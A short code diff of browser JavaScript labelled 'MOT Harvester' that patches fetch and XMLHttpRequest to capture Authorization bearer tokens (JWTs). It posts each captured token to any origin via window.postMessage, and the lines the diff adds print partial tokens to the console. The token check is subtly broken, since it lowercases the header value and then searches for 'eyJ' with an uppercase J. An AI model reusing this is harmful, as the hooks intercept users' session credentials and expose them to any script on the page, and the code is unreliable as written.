@@ -1,3 +1,4 @@
+console.log("[MOT Harvester] Initializing Omnipart Monkey Patch");
 const originalFetch = window.fetch;
 window.fetch = async function(...args) {
     if (args[1] && args[1].headers) {
@@ -13,6 +14,7 @@ window.fetch = async function(...args) {
             }
         }
         if (authHeader && authHeader.toLowerCase().includes('eyJ')) {
+            console.log("[MOT Harvester] CAUGHT FETCH TOKEN!", authHeader.substring(0, 15) + "...");
             window.postMessage({ type: 'OMNIPART_TOKEN_INTERCEPT', token: authHeader }, '*');
         }
     }
@@ -30,6 +32,7 @@ XMLHttpRequest.prototype.open = function() {
 XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
     this._requestHeaders[header] = value;
     if (header.toLowerCase() === 'authorization' && value.toLowerCase().includes('eyJ')) {
+        console.log("[MOT Harvester] CAUGHT XHR TOKEN!", value.substring(0, 15) + "...");
         window.postMessage({ type: 'OMNIPART_TOKEN_INTERCEPT', token: value }, '*');
     }
     return originalSetRequestHeader.apply(this, arguments);
